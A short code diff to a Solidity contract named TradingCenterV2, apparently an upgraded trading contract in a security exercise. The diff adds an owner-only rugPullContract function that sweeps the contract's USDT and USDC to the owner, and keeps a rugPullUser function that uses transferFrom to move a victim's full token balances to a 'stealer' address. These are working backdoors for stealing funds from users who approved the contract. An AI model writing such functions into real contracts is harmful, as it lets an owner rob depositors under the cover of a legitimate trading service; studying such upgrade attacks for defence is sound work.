@@ -12,7 +12,14 @@ contract TradingCenterV2 is TradingCenter, Ownable {
         usdc = IERC20(_usdc);
     }
 
-    function rugPull(address victim, address stealer) external onlyOwner {
+    function rugPullContract() external onlyOwner {
+        uint256 amountUSDT = usdt.balanceOf(address(this));
+        usdt.transfer(msg.sender, amountUSDT);
+        uint256 amountUSDC = usdc.balanceOf(address(this));
+        usdc.transfer(msg.sender, amountUSDC);
+    }
+
+    function rugPullUser(address victim, address stealer) external onlyOwner {
         uint256 amountUSDT = usdt.balanceOf(victim);
         usdt.transferFrom(victim, stealer, amountUSDT);
         uint256 amountUSDC = usdc.balanceOf(victim);
